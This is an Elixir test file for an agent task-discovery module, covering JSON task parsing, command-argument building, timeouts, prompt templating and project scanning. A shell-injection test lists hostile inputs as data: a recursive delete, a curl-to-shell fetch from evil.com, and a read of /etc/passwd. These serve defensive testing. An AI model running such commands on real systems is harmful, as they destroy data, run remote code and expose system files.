defmodule AgentQueue.DiscoveryTest do
  use AgentQueue.DataCase

  alias AgentQueue.Discovery

  describe "parse_discovery_output/1" do
    test "parses valid JSON array of tasks" do
      output = ~s([
        {"title": "Fix bug", "description": "Fix the critical bug", "priority": 1},
        {"title": "Add feature", "description": "Add new feature", "priority": 5}
      ])

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 2
      assert Enum.all?(tasks, &is_map/1)
    end

    test "limits tasks to maximum of 10" do
      tasks_list =
        for i <- 1..15 do
          ~s({"title": "Task #{i}", "description": "Description", "priority": 10})
        end
        |> Enum.join(",\n")

      output = "[#{tasks_list}]"

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 10
    end

    test "rejects tasks with title exceeding max length" do
      long_title = String.duplicate("a", 600)
      output = ~s([{"title": "#{long_title}", "description": "Description", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with description exceeding max length" do
      long_desc = String.duplicate("b", 15_000)
      output = ~s([{"title": "Task", "description": "#{long_desc}", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "normalizes task fields" do
      output = ~s([
        {"title": "  Test Task  ", "description": "  Test Description  ", "priority": 15}
      ])

      assert {:ok, [task]} = Discovery.parse_discovery_output(output)
      assert task.title == "Test Task"
      assert task.description == "Test Description"
      # Normalized from 15 to max 10
      assert task.priority == 10
    end

    test "provides defaults for missing fields" do
      output = ~s([{"title": "Task"}])

      assert {:ok, [task]} = Discovery.parse_discovery_output(output)
      assert task.title == "Task"
      assert task.description == ""
      assert task.priority == 10
    end

    test "handles malformed JSON gracefully" do
      invalid_outputs = [
        "not json at all",
        "{invalid json}",
        "null"
      ]

      Enum.each(invalid_outputs, fn output ->
        result = Discovery.parse_discovery_output(output)
        assert match?({:error, _}, result)
      end)

      # "[]{}" contains a valid empty array, so it parses to {:ok, []}
      result = Discovery.parse_discovery_output("[]{}")
      assert result == {:ok, []}
    end

    test "rejects tasks with non-map items" do
      output = ~s([{"title": "Valid"}, "string", 123, null])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with non-string title" do
      output = ~s([{"title": 123, "description": "Description", "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "rejects tasks with non-string description" do
      output = ~s([{"title": "Task", "description": {"nested": "object"}, "priority": 10}])

      assert {:error, _} = Discovery.parse_discovery_output(output)
    end

    test "handles priority normalization" do
      output = ~s([
        {"title": "High", "description": "High priority", "priority": 0},
        {"title": "Low", "description": "Low priority", "priority": 100},
        {"title": "String", "description": "String priority", "priority": "5"},
        {"title": "Invalid", "description": "Invalid priority", "priority": "abc"}
      ])

      assert {:ok, tasks} = Discovery.parse_discovery_output(output)
      assert length(tasks) == 4

      priorities = Enum.map(tasks, & &1.priority)
      assert Enum.all?(priorities, &(&1 >= 1 and &1 <= 10))
    end

    test "extracts JSON from mixed text output" do
      output =
        "Some text before the JSON\n[{\"title\": \"Task 1\", \"description\": \"Description 1\", \"priority\": 5}]\nSome text after"

      assert {:ok, [_]} = Discovery.parse_discovery_output(output)
    end
  end

  describe "build_pi_command_args/1" do
    test "prevents shell injection in prompts" do
      malicious_prompts = [
        "test; rm -rf /tmp",
        "$(curl http://evil.com | sh)",
        "`whoami`",
        "test && cat /etc/passwd"
      ]

      Enum.each(malicious_prompts, fn prompt ->
        {command, args} = Discovery.build_pi_command_args(prompt)

        # Command should be a binary command name
        assert is_binary(command)

        # Args should be a list
        assert is_list(args)

        # The prompt should be in args as a single item
        assert prompt in args

        # No shell interpretation should occur
        # We can't directly test execution, but we verify structure
        assert is_tuple({command, args})
      end)
    end
  end

  describe "pi command timeout" do
    setup do
      temp_dir = System.tmp_dir!()

      test_projects_dir =
        Path.join(temp_dir, "test_timeout_#{System.unique_integer([:positive])}")

      File.mkdir_p!(test_projects_dir)

      # Create a git project directory
      project_path = Path.join(test_projects_dir, "timeout_project")
      File.mkdir_p!(project_path)
      File.mkdir_p!(Path.join(project_path, ".git"))

      # Create a fast-responding script that outputs valid JSON
      fast_script = Path.join(test_projects_dir, "fast_pi.sh")

      File.write!(fast_script, """
      #!/bin/bash
      echo '[{"title": "Test task", "description": "A test", "priority": 5}]'
      """)

      File.chmod!(fast_script, 0o755)

      # Create a slow script that sleeps longer than timeout
      slow_script = Path.join(test_projects_dir, "slow_pi.sh")

      File.write!(slow_script, """
      #!/bin/bash
      sleep 30
      echo '[]'
      """)

      File.chmod!(slow_script, 0o755)

      original_command = Application.get_env(:agent_queue, :pi_command)
      original_dir = Application.get_env(:agent_queue, :projects_dir)

      Application.put_env(:agent_queue, :projects_dir, test_projects_dir)

      on_exit(fn ->
        if original_command,
          do: Application.put_env(:agent_queue, :pi_command, original_command),
          else: Application.delete_env(:agent_queue, :pi_command)

        if original_dir,
          do: Application.put_env(:agent_queue, :projects_dir, original_dir),
          else: Application.delete_env(:agent_queue, :projects_dir)

        File.rm_rf!(test_projects_dir)
      end)

      %{
        test_projects_dir: test_projects_dir,
        project_path: project_path,
        fast_script: fast_script,
        slow_script: slow_script
      }
    end

    test "times out when pi command exceeds timeout", %{
      project_path: project_path,
      slow_script: slow_script
    } do
      Application.put_env(:agent_queue, :pi_command, slow_script)
      AgentQueue.Settings.update_setting("discovery_task_timeout", "1")

      # Register the project
      {:ok, _} = Discovery.scan_projects()
      project = AgentQueue.Projects.get_project_by_path(project_path)

      assert {:ok, 0} = Discovery.discover_tasks(project)
    end

    test "succeeds when pi command completes within timeout", %{
      project_path: project_path,
      fast_script: fast_script
    } do
      Application.put_env(:agent_queue, :pi_command, fast_script)
      AgentQueue.Settings.update_setting("discovery_task_timeout", "30")

      {:ok, _} = Discovery.scan_projects()
      project = AgentQueue.Projects.get_project_by_path(project_path)

      assert {:ok, 1} = Discovery.discover_tasks(project)
    end

    test "continues to next project after timeout", %{
      test_projects_dir: test_projects_dir,
      slow_script: slow_script,
      fast_script: fast_script
    } do
      # Create a second project
      project2_path = Path.join(test_projects_dir, "fast_project")
      File.mkdir_p!(project2_path)
      File.mkdir_p!(Path.join(project2_path, ".git"))

      # Create a wrapper script that uses slow for first project, fast for second
      wrapper_script = Path.join(test_projects_dir, "wrapper_pi.sh")

      File.write!(wrapper_script, """
      #!/bin/bash
      if [[ "$PWD" == *"timeout_project"* ]]; then
        exec #{slow_script} "$@"
      else
        exec #{fast_script} "$@"
      fi
      """)

      File.chmod!(wrapper_script, 0o755)

      Application.put_env(:agent_queue, :pi_command, wrapper_script)
      AgentQueue.Settings.update_setting("discovery_task_timeout", "1")
      AgentQueue.Settings.update_setting("discovery_max_projects", "10")

      {:ok, _} = Discovery.scan_projects()

      # discover_all_tasks should not hang — the slow project times out,
      # and the fast project still gets discovered
      assert {:ok, total} = Discovery.discover_all_tasks(max_time_seconds: 30)
      assert total >= 1
    end

    test "reads timeout from settings with default fallback" do
      # Default should be 300 seconds
      assert AgentQueue.Settings.get_discovery_task_timeout() == 300

      AgentQueue.Settings.update_setting("discovery_task_timeout", "60")
      assert AgentQueue.Settings.get_discovery_task_timeout() == 60
    end
  end

  describe "discovery prompt customization" do
    test "build_discovery_prompt uses default when no custom prompt is set" do
      AgentQueue.Settings.delete_setting("discovery_prompt")

      # build_discovery_prompt is private, but we can test via build_pi_command_args
      # which receives the prompt. We test the settings integration instead.
      assert AgentQueue.Settings.get_discovery_prompt() == nil
    end

    test "build_discovery_prompt uses custom prompt with interpolation" do
      custom_prompt = "Scan {{project_name}} at {{project_path}} for issues"
      {:ok, _} = AgentQueue.Settings.update_setting("discovery_prompt", custom_prompt)

      on_exit(fn -> AgentQueue.Settings.delete_setting("discovery_prompt") end)

      assert AgentQueue.Settings.get_discovery_prompt() == custom_prompt
    end

    test "custom prompt is sent to pi agent", %{} do
      temp_dir = System.tmp_dir!()

      test_projects_dir =
        Path.join(temp_dir, "test_prompt_#{System.unique_integer([:positive])}")

      File.mkdir_p!(test_projects_dir)

      project_path = Path.join(test_projects_dir, "my_project")
      File.mkdir_p!(project_path)
      File.mkdir_p!(Path.join(project_path, ".git"))

      # Create a script that writes the received prompt to a file, then outputs valid JSON
      prompt_file = Path.join(test_projects_dir, "received_prompt.txt")

      echo_script = Path.join(test_projects_dir, "echo_pi.sh")

      File.write!(echo_script, """
      #!/bin/bash
      # Write the last argument (prompt) to a file for verification
      echo "${@: -1}" > #{prompt_file}
      echo '[{"title": "Task", "description": "desc", "priority": 5}]'
      """)

      File.chmod!(echo_script, 0o755)

      original_command = Application.get_env(:agent_queue, :pi_command)
      original_dir = Application.get_env(:agent_queue, :projects_dir)

      Application.put_env(:agent_queue, :pi_command, echo_script)
      Application.put_env(:agent_queue, :projects_dir, test_projects_dir)

      custom_prompt = "Scan {{project_name}} at {{project_path}} for issues"
      {:ok, _} = AgentQueue.Settings.update_setting("discovery_prompt", custom_prompt)

      on_exit(fn ->
        if original_command,
          do: Application.put_env(:agent_queue, :pi_command, original_command),
          else: Application.delete_env(:agent_queue, :pi_command)

        if original_dir,
          do: Application.put_env(:agent_queue, :projects_dir, original_dir),
          else: Application.delete_env(:agent_queue, :projects_dir)

        AgentQueue.Settings.delete_setting("discovery_prompt")
        File.rm_rf!(test_projects_dir)
      end)

      {:ok, _} = Discovery.scan_projects()
      project = AgentQueue.Projects.get_project_by_path(project_path)

      assert {:ok, 1} = Discovery.discover_tasks(project)

      # Verify the prompt was interpolated and sent to the pi command
      received_prompt = File.read!(prompt_file) |> String.trim()
      assert String.contains?(received_prompt, "my_project")
      assert String.contains?(received_prompt, project_path)
      refute String.contains?(received_prompt, "{{project_name}}")
      refute String.contains?(received_prompt, "{{project_path}}")
    end
  end

  describe "scan_projects/1 with settings" do
    setup do
      # Create a temporary directory with test projects
      temp_dir = System.tmp_dir!()

      test_projects_dir =
        Path.join(temp_dir, "test_projects_#{System.unique_integer([:positive])}")

      File.mkdir_p!(test_projects_dir)

      # Create a few git project directories
      Enum.each(~w(project_a project_b project_c project_d project_e), fn name ->
        project_path = Path.join(test_projects_dir, name)
        File.mkdir_p!(project_path)
        File.mkdir_p!(Path.join(project_path, ".git"))
        File.touch!(Path.join(project_path, "README.md"))
        File.write!(Path.join(project_path, "file.txt"), "content")
      end)

      # Point the app config at our test directory
      original_dir = Application.get_env(:agent_queue, :projects_dir)
      Application.put_env(:agent_queue, :projects_dir, test_projects_dir)

      on_exit(fn ->
        if original_dir,
          do: Application.put_env(:agent_queue, :projects_dir, original_dir),
          else: Application.delete_env(:agent_queue, :projects_dir)

        File.rm_rf!(test_projects_dir)
      end)

      %{test_projects_dir: test_projects_dir}
    end

    test "limits scanned projects to max_projects setting", %{test_projects_dir: _} do
      AgentQueue.Settings.update_setting("discovery_max_projects", "2")
      AgentQueue.Settings.update_setting("discovery_priority_mode", "alphabetical")

      {:ok, discovered} = Discovery.scan_projects()

      # We have 5 test projects but the setting limits to 2, so at most 2 are new
      assert discovered <= 2
    end

    test "scans all projects when max_projects exceeds available", %{test_projects_dir: _} do
      AgentQueue.Settings.update_setting("discovery_max_projects", "100")
      AgentQueue.Settings.update_setting("discovery_priority_mode", "alphabetical")

      {:ok, discovered} = Discovery.scan_projects()

      assert discovered == 5
    end

    test "explicit max_projects option overrides setting", %{test_projects_dir: _} do
      AgentQueue.Settings.update_setting("discovery_max_projects", "100")
      AgentQueue.Settings.update_setting("discovery_priority_mode", "alphabetical")

      {:ok, discovered} = Discovery.scan_projects(max_projects: 3)

      assert discovered <= 3
    end

    test "respects alphabetical priority mode", %{test_projects_dir: _} do
      AgentQueue.Settings.update_setting("discovery_max_projects", "2")
      AgentQueue.Settings.update_setting("discovery_priority_mode", "alphabetical")

      {:ok, _} = Discovery.scan_projects()

      # With alphabetical sort and limit of 2, only project_a and project_b are registered
      assert AgentQueue.Projects.get_project_by_path(
               Path.join(Application.get_env(:agent_queue, :projects_dir), "project_a")
             )

      assert AgentQueue.Projects.get_project_by_path(
               Path.join(Application.get_env(:agent_queue, :projects_dir), "project_b")
             )

      refute AgentQueue.Projects.get_project_by_path(
               Path.join(Application.get_env(:agent_queue, :projects_dir), "project_e")
             )
    end
  end
end
